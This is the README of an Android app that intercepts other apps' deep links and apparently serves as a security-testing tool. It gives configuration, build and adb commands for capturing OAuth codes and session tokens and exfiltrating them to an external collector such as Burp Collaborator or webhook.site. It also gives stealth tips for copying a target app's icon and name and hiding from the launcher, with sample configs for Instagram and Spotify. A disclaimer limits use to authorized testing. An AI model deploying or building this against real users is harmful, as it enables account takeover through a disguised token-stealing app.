# 🔗 Universal Deep Link Proxy

A configurable Android app for intercepting and analyzing deep links from any application. Perfect for security research, penetration testing, and understanding OAuth flows.

## 🎯 Features

✅ **Universal** - Works with any app's deep link scheme  
✅ **Stealth Mode** - Transparent to the end user  
✅ **Configuration-Based** - No code changes required  
✅ **Data Exfiltration** - Sends all captured data to your server  
✅ **Local Backup** - Persistent logging on device  
✅ **Token Capture** - Automatically identifies sensitive parameters  

## 🚀 Quick Start

### 1. Clone or Use Template

```bash
git clone https://github.com/EVA-Information-Security-Consluting/DeepLinkProxyApplication
cd DeepLinkProxyApplication
```

### 2. Configure

Edit `app/src/main/res/values/config.xml`:

```xml
<resources>
    <!-- Your Burp Collaborator, webhook, or server URL -->
    <string name="server_url">https://YOUR-ID.oastify.com</string>
    
    <!-- Target app package (find with: adb shell pm list packages) -->
    <string name="target_package">com.example.targetapp</string>
    
    <!-- Deep link scheme to intercept -->
    <string name="deep_link_scheme">myapp</string>
</resources>
```

### 3. Build & Install

```bash
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### 4. Test

```bash
# Trigger a deep link
adb shell am start -a android.intent.action.VIEW \
    -d "myapp://test?token=abc123"

# Check your Burp Collaborator or webhook for captured data
```

## 📖 Detailed Setup

See [CONFIG.md](CONFIG.md) for comprehensive configuration options and examples.

## 🔍 How It Works

```
User clicks link
       ↓
Android System
       ↓
   ┌─────────────────┐
   │  Your Proxy App  │ ← Intercepts deep link
   └─────────────────┘
       ↓          ↓
  Exfiltrate   Forward
  to Server    to Real App
       ↓          ↓
   [Collab]   [Target App]
```

1. **Deep link triggered** (e.g., `myapp://action?token=xyz`)
2. **Android routes to proxy** (your app claims the scheme)
3. **Proxy captures all data** (URI, parameters, tokens)
4. **Data exfiltrated** to your configured server
5. **Proxy forwards** to legitimate app
6. **User experience unchanged** (stealth mode)

## 📦 What Gets Captured

All data is sent as JSON to your configured `server_url`:

```json
{
  "full_uri": "myapp://silentlogin?tokenId=abc-123&userId=user_456",
  "scheme": "myapp",
  "host": "silentlogin",
  "path": "",
  "parameters": {
    "tokenId": "abc-123",
    "userId": "user_456"
  },
  "authority": null,
  "encoded_path": "",
  "encoded_query": "tokenId=abc-123&userId=user_456",
  "encoded_fragment": null,
  "timestamp": 1703347200000,
  "device": "Pixel 7a",
  "android_version": "34",
  "captured_at": "2024-12-23 14:30:00"
}
```

## 🛠️ Use Cases

### OAuth / Single Sign-On Testing
Capture OAuth callback tokens before they reach the app:
```
myapp://oauth/callback?code=AUTH_CODE&state=STATE_TOKEN
```

### Deep Link Parameter Injection
Analyze what parameters apps accept:
```
myapp://action?param1=value1&param2=value2
```

### Session Token Interception
Capture authentication tokens in deep links:
```
myapp://silentlogin?sessionToken=JWT_TOKEN
```

### Universal Link Analysis
Test web-to-app transitions:
```
https://example.com/app/action?data=sensitive
```

## 🔧 Advanced Configuration

### Custom Forwarding Delay

```xml
<!-- Wait 2 seconds before forwarding -->
<integer name="forward_delay_ms">2000</integer>
```

### Disable Local Logging

```xml
<!-- Only send to server, don't save locally -->
<bool name="enable_local_logging">false</bool>
```

### Enable Debug Mode

```xml
<!-- Show toast notifications for debugging -->
<bool name="show_debug_toasts">true</bool>
```

## 🕵️ Stealth Mode Tips

1. **Match the icon** - Replace `ic_launcher` with target app's icon
2. **Same app name** - Update `app_name` in `strings.xml`
3. **Hide from launcher** - Remove `LAUNCHER` category (optional)
4. **Minimal delay** - Set `forward_delay_ms` to 500 or less
5. **No toasts** - Keep `show_debug_toasts` set to `false`

## 📱 Testing Tools

### Monitor Live Captures
```bash
# Watch logcat for intercepted links
adb logcat | grep DeepLinkProxy

# Or use the included script
./monitor_tokens.sh
```

### Extract Saved Data
```bash
# Pull local backup from device
./extract_logs.sh

# View contents
cat captured_data.json | jq
```

### Find Target Package
```bash
# List all apps
adb shell pm list packages

# Find specific app
./find_target_app.sh KEYWORD

# Example
./find_target_app.sh instagram
```

### Test Deep Links
```bash
# Use included test script
./test_deeplink.sh myapp://test?param=value

# Or manually
adb shell am start -a android.intent.action.VIEW -d "myapp://test"
```

## 🎓 Example Configurations

### Instagram Deep Links

```xml
<string name="server_url">https://your-collab.oastify.com</string>
<string name="target_package">com.instagram.android</string>
<string name="deep_link_scheme">instagram</string>
```

### Spotify OAuth

```xml
<string name="server_url">https://webhook.site/YOUR-UUID</string>
<string name="target_package">com.spotify.music</string>
<string name="deep_link_scheme">spotify</string>
```

### Custom App Testing

```xml
<string name="server_url">https://requestbin.com/YOUR-BIN</string>
<string name="target_package">com.company.app</string>
<string name="deep_link_scheme">companyapp</string>
```

## ⚠️ Security & Legal

### Responsible Use

This tool is for **authorized security testing only**:

- ✅ Testing your own applications
- ✅ Authorized penetration testing engagements
- ✅ Bug bounty programs with proper scope
- ✅ Security research with permission

### Not For

- ❌ Unauthorized access to accounts
- ❌ Stealing credentials or tokens
- ❌ Violating terms of service
- ❌ Any illegal activity

### Detection Risk

Apps may detect deep link interception through:
- Time analysis (delays in handling)
- Multiple resolver dialogs
- Certificate pinning (if you proxy HTTPS)
- Root/tamper detection

Always follow responsible disclosure practices.

## 🔍 Troubleshooting

**Problem:** App chooser shows both proxy and real app  
**Solution:** This is normal Android behavior when multiple apps claim the same scheme. User must select your proxy app.

**Problem:** Real app doesn't open after interception  
**Solution:** Verify `target_package` in config.xml matches exactly: `adb shell pm list packages | grep YOUR_APP`

**Problem:** No data reaching server  
**Solution:** 
1. Check `INTERNET` permission in AndroidManifest.xml
2. Verify server URL is correct
3. Check device has internet connection
4. View logs: `adb logcat | grep DeepLinkProxy`

**Problem:** Deep link not intercepted  
**Solution:**
1. Ensure `deep_link_scheme` matches target app's scheme exactly
2. Reinstall proxy app: `adb install -r app-debug.apk`
3. Clear default app handlers: Settings → Apps → Default Apps

## 🤝 Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## 📝 License

This project is provided for educational and authorized security testing purposes only. See [LICENSE](LICENSE) for details.

## 🔗 Related Projects

- [Frida](https://frida.re/) - Dynamic instrumentation toolkit
- [Objection](https://github.com/sensepost/objection) - Runtime mobile exploration
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile security testing framework

## 📧 Contact

For questions or security concerns, please open an issue.

---

**Remember:** Always obtain proper authorization before testing applications you don't own.

